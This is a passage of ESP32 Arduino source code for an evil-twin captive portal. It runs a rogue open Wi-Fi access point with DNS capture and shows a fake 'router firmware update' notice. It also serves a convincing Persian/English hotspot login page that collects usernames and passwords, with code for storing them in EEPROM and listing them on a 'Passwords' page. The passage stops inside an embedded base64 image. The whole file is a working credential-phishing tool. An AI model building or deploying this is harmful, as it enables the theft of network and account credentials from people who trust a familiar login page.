// Libraries
#include <WiFi.h>
#include <DNSServer.h> 
#include <WebServer.h>
#include <EEPROM.h>
#define LED_BUILTIN 2

const char* SSID_NAME = "om_WIFI";

#define SUBTITLE "Confidential"
#define TITLE "Update"
#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
#define POST_TITLE "Updating..."
#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);

String allUsername = "";
String allPass = "";
String Username_Pass = "";
String newSSID = "";
String currentSSID = "";

int initialCheckLocation = 20; 
int passStart = 30;
int passEnd = passStart;

unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { 
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>" + a + " :: " + t + "</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>" + CSS + "</style>"
    "<meta charset=\"UTF-8\"></head>"
    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h; }

String index() {
  String htmlCode = "<!DOCTYPE html>\n"
                    "<html lang=\"fa\">\n"
                    "<head>\n"
                    "  <meta charset=\"utf-8\">\n"
                    "  <title>ورود به حساب کاربری</title>\n"
                    "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n"
                    "  <style>\n"
                    "    body {\n"
                    "      margin: 0;\n"
                    "      padding: 0;\n"
                    "      font-family: sans-serif;\n"
                    "      background: linear-gradient(135deg, #141e30, #243b55);\n"
                    "      height: 100vh;\n"
                    "      display: flex;\n"
                    "      justify-content: center;\n"
                    "      align-items: center;\n"
                    "      direction: inherit;\n"
                    "    }\n"
                    "    body.ltr { direction: ltr; }\n"
                    "    h2, p, a { color: #ffffff; }\n"
                    "    .container { display: flex; flex-direction: column; align-items: center; }\n"
                    "    .language-selector { display: flex; gap: 10px; margin-bottom: 20px; }\n"
                    "    .language-btn { background: transparent; border: 2px solid white; border-radius: 8px; padding: 5px 12px; color: white; font-size: 14px; cursor: pointer; transition: all 0.3s ease; }\n"
                    "    .language-btn:hover { background: white; color: black; }\n"
                    "    .language-btn.active { background-color: #ffffff; color: black; }\n"
                    "    .loginBox { width: 380px; background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 12px; padding: 30px 25px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4); text-align: center; display: flex; flex-direction: column; align-items: center; animation: fadeIn 0.5s ease-out; }\n"
                    "    .logo img { width: 100px; margin-bottom: 15px; }\n"
                    "    .inputBox { margin-bottom: 20px; width: 100%; display: flex; justify-content: center; }\n"
                    "    .inputBox input { width: 100%; max-width: 300px; padding: 12px; background: rgba(255, 255, 255, 0.1); border: none; border-radius: 8px; color: white; font-size: 16px; text-align: center; direction: inherit; }\n"
                    "    ::placeholder { color: rgba(255, 255, 255, 0.7); }\n"
                    "    input[type=\"submit\"] { min-width: 150px; padding: 12px 25px; margin-top: 10px; background: #5cb85c; border: none; border-radius: 30px; color: #ffffff; font-weight: bold; font-size: 18px; cursor: pointer; transition: background-color 0.3s ease; }\n"
                    "    input[type=\"submit\"]:hover { background: #4cae4c; }\n"
                    "    .links { display: flex; justify-content: space-evenly; width: 100%; margin-top: 20px; font-size: 14px; }\n"
                    "    .links a { color: white; text-decoration: none; font-size: 16px; padding: 0 15px; }\n"
                    "    .links a:hover { color: #ffcc00; }\n"
                    "    .footer { margin-top: 20px; font-size: 14px; color: #ccc; }\n"
                    "    .error-message { color: red; font-size: 0.9em; margin-top: 10px; padding: 10px; border: 1px solid red; border-radius: 5px; display: none; }\n"
                    "    @keyframes fadeIn { 0% { opacity: 0; transform: scale(0.95); } 100% { opacity: 1; transform: scale(1); } }\n"
                    "  </style>\n"
                    "  <script>\n"
                    "    const languageData = {\n"
                    "      fa: {\n"
                    "        \"login-header\": \"ورود به حساب کاربری\",\n"
                    "        \"username-placeholder\": \"نام کاربری\",\n"
                    "        \"password-placeholder\": \"رمز عبور\",\n"
                    "        \"submit-btn\": \"ورود\",\n"
                    "        \"forgot-password\": \"فراموشی رمز عبور\",\n"
                    "        \"user-portal\": \"خرید شارژ / پورتال کاربری\",\n"
                    "        \"footer-text\": \"امکان استفاده آزمایشی: <a href='#'>اینجا کلیک کنید</a>\",\n"
                    "        \"title\": \"ورود به حساب کاربری\"\n"
                    "      },\n"
                    "      en: {\n"
                    "        \"login-header\": \"Login to User Account\",\n"
                    "        \"username-placeholder\": \"Username\",\n"
                    "        \"password-placeholder\": \"Password\",\n"
                    "        \"submit-btn\": \"Login\",\n"
                    "        \"forgot-password\": \"Forgot Password\",\n"
                    "        \"user-portal\": \"Buy Credit / User Portal\",\n"
                    "        \"footer-text\": \"Trial access: <a href='#'>Click here</a>\",\n"
                    "        \"title\": \"Login to User Account\"\n"
                    "      }\n"
                    "    };\n"
                    "    function changeLanguage(lang) {\n"
                    "      const data = languageData[lang];\n"
                    "      document.title = data[\"title\"];\n"
                    "      document.getElementById(\"login-header\").innerHTML = data[\"login-header\"];\n"
                    "      document.getElementById(\"username_user\").placeholder = data[\"username-placeholder\"];\n"
                    "      document.getElementById(\"password_user\").placeholder = data[\"password-placeholder\"];\n"
                    "      document.getElementById(\"submit-btn\").value = data[\"submit-btn\"];\n"
                    "      document.getElementById(\"forgot-password\").innerHTML = data[\"forgot-password\"];\n"
                    "      document.getElementById(\"user-portal\").innerHTML = data[\"user-portal\"];\n"
                    "      document.getElementById(\"footer-text\").innerHTML = data[\"footer-text\"];\n"
                    "      document.body.classList.toggle(\"ltr\", lang === \"en\");\n"
                    "      localStorage.setItem('lang', lang);\n"
                    "      document.querySelectorAll('.language-btn').forEach(btn => btn.classList.remove('active'));\n"
                    "      document.querySelector(`.language-btn[onclick*=\"changeLanguage('${lang}')\"]`).classList.add('active');\n"
                    "    }\n"
                    "    document.addEventListener('DOMContentLoaded', function() {\n"
                    "      const savedLang = localStorage.getItem('lang') || 'fa';\n"
                    "      changeLanguage(savedLang);\n"
                    "      const errorMessageDiv = document.getElementById('error-message');\n"
                    "      const error = '';\n"
                    "      if (error) {\n"
                    "        errorMessageDiv.textContent = error;\n"
                    "        errorMessageDiv.style.display = 'block';\n"
                    "      }\n"
                    "    });\n"
                    "  </script>\n"
                    "</head>\n"
                    "<body>\n"
                    "<div class=\"container\">\n"
                    "  <div class=\"language-selector\">\n"
                    "    <button type=\"button\" class=\"language-btn\" onclick=\"changeLanguage('fa')\">FA</button>\n"
                    "    <button type=\"button\" class=\"language-btn\" onclick=\"changeLanguage('en')\">EN</button>\n"
                    "  </div>\n"
                    "  <form name=\"login\" action=\"/login\" method=\"post\" class=\"loginBox\">\n"
                    "    <input type=\"hidden\" name=\"dst\" value=\"http://www.msftconnecttest.com/redirect\">\n"
                    "    <input type=\"hidden\" name=\"popup\" value=\"true\">\n"
                    "    <div class=\"logo\">\n"
                    "      <img src=\"data:image/png;base64,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